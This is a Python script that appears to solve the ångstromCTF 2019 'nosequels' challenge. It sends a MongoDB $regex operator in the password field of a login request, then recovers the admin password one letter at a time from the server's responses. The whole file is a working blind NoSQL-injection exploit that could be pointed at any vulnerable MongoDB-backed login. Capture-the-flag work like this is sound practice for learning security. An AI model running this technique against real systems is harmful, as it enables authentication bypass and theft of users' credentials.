import json
import requests

# use a session because we need to keep cookies
s = requests.session()
s.get("https://nosequels.2019.chall.actf.co/login")

# this will try a regex and return if it was successful
def tryRegex(regex):
	r = s.post("https://nosequels.2019.chall.actf.co/login", json={"username": "admin", "password": {"$regex": regex}})
	if r.content == b"Wrong username or password":
		return False
	return True

# this is our password
passwd = ""
# loop until we have our password
while True:
	# loop through every character
	for c in "abcdefghijklmnopqrstuvwxyz":
		# append it to our password and check it
		if tryRegex("^" + passwd + c):
			# if it is correct, append it to the password and break out of the for loop
			passwd += c
			# print it at each step
			print(passwd)
			break
	else:
		# we have tried all the letters and found none that worked, we must be done
		break
	# we broke out of the for loop, so continue to the next letter
	continue